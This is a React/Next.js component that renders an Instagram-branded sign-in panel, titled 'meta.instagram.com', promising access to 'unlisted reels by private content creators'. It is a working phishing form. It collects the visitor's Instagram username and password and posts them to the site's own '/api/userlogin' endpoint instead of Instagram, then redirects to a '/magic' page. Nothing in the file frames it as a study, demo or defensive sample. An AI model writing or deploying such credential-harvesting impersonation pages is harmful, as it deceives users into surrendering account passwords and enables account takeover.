/* eslint-disable @typescript-eslint/no-explicit-any */
"use client"
import React, { useState } from 'react';
import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle, SheetTrigger, } from "@/components/ui/sheet"
import { Input } from '../ui/input';
import { Button } from '../ui/button';
import Image from 'next/image';
import axios from 'axios';
import { toast } from "sonner"
import { useRouter } from 'next/navigation';

const InstaSheet = ({ children }: { children: React.ReactNode }) => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');

    const router = useRouter();

    const handleSubmitRecord = async (e: any) => {
        e.preventDefault();
        if(!username || !password) {
            toast("You can't proceed without this step", {
                description: "fill the required fields"
            })
        }
        try {
            const res = await axios.post('/api/userlogin', {
                user_name: username,
                password: password
            });
            if(res.status == 202) {
                return toast("User Already Exist!!")
            }
            router.push('/magic')
        } catch (error: any) {
            console.log(error.message)
        }
    }

    return (
        <Sheet>
            <SheetTrigger asChild>{children}</SheetTrigger>
            <SheetContent className='bg-slate-900 border-slate-700 min-w-full lg:min-w-[400px]' >
                <SheetHeader>
                    <SheetTitle className='text-slate-600'>
                        meta.instagram.com
                    </SheetTitle>
                    <SheetDescription>
                        meta.developers.com, please signin using your instagram gmail or username, this will allow you to watch unlisted reels by private content creators.
                    </SheetDescription>
                </SheetHeader>
                <div className='flex justify-center items-center w-full'>
                    <Image src="/images/instatext.png" width={150} height={30} alt='insta-text'  />
                </div>
                <h1 className='text-sm font-semibold text-neutral-400 text-center'>login with instagram to see the magic</h1>
                <div className='p-3'>
                    <form onSubmit={handleSubmitRecord}>
                        <Input
                            placeholder='username or email'
                            className='outline-none border-slate-700 mb-2 text-sm text-white'
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                        />
                        <Input
                            placeholder='password'
                            className='outline-none border-slate-700 mb-2 text-sm text-white'
                            type='password'
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                        />
                        <div className='w-full justify-center flex'>
                            <Button variant="outline" className='bg-transparent text-neutral-300 text-sm font-light w-[170px] border-slate-700'>Watch Now</Button>
                        </div>
                    </form>
                </div>
            </SheetContent>
        </Sheet>
    );
}

export default InstaSheet;
